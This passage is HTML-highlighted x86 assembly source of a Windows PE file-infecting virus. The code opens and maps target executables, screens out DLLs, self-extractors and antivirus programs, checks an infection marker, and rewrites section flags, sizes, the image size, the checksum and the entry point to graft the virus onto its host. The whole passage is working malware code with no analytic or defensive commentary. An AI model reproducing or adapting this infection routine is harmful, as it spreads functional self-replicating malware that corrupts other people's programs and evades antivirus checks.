        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000080h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; open the file RW</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorAttrib</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetFileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get file size</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorClose</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileTime2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileTime1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">fileTime0</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_GetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; get... :)</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorClose</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHnd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_CreateFileMappingA</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; file mapping</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorClose</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000004h</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhmap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_MapViewOfFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; map a view</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorCloseMap</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">; check is exe</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; check is PE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; take care of strange</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">        </span><span class="sc1">; DOS headers</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; check executable type:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">                          </span><span class="sc1">; check is executable</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">                       </span><span class="sc1">; check not DLL</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">5ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; check not native</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">seflextractors</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">seflextractor</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">searchStringz</span><span class="sc0">                   </span><span class="sc1">; check is not self-extractor</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; file</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">antiviruss</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">antivirus</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapMem</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">searchStringz</span><span class="sc0">                   </span><span class="sc1">; check is not antivirus</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">; file</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                         </span><span class="sc1">; goto last section</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0e0000020h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0e0000020h</span><span class="sc0">                  </span><span class="sc1">; infected yet? :?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infectionErrorCloseUnmap</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; first fix</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">skipFixRVA0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">skipFixRVA0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; calc new EP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; relocation stuff</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virusEP</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">baseAddr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; for API hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hostEP</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; save old EP</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; setup EP addr in file</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">epAddr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0e0000020h</span><span class="sc0">  </span><span class="sc1">; set sect properties</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">10000000h</span><span class="sc0"> </span><span class="sc1">; avoid shared section</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; zero PE checksum</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vSize</span><span class="sc0">                       </span><span class="sc1">; the section phys size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; store the phys size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; quit curr virt size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; calc new Virt size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; i fix the section</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">skipFixRVA</span><span class="sc0">                      </span><span class="sc1">; if phys&gt;virt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; virt=phys</span><span class="sc0">
</span><span class="sc5">skipFixRVA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vVSize</span><span class="sc0">                      </span><span class="sc1">; increase with virus</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; virt size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; fix the image size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; fix the virtual size</span><span class="sc0">

